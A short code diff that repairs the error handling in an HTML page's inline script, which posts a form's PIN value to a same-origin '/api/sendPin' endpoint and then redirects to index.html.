@@ -194,24 +194,27 @@
 </div>
 
 <div class="col-md-6 form-group">&nbsp;</div>
- <script>
-    document.getElementById("pinForm").addEventListener("submit", async function(e) {
-      e.preventDefault();
-		
-const pin = e.target.pin_code.value; // إذا غيرتي الاسم
-await fetch("/api/sendPin", {
-  method: "POST",
-  headers: { "Content-Type": "application/json" },
-  body: JSON.stringify({ pin_code: pin }) // أو pin حسب الاسم
-});
+<script>
+document.getElementById("pinForm").addEventListener("submit", async function(e) {
+  e.preventDefault();
+  const pin = e.target.pin_code.value;
 
-        // بعد الإرسال → redirect
-        window.location.href = "index.html";
-      } catch (err) {
-        alert("❌ Error al enviar PIN");
-      }
+  try {
+    await fetch("/api/sendPin", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ pin_code: pin })
     });
-  </script>
+
+    // redirect بعد الإرسال
+    window.location.href = "index.html";
+  } catch (err) {
+    console.error(err);
+    alert("❌ Error al enviar PIN");
+  }
+});
+</script>
+
 <div class="row">
 <div class="col-md-6 form-group">&nbsp;</div>
 </div>
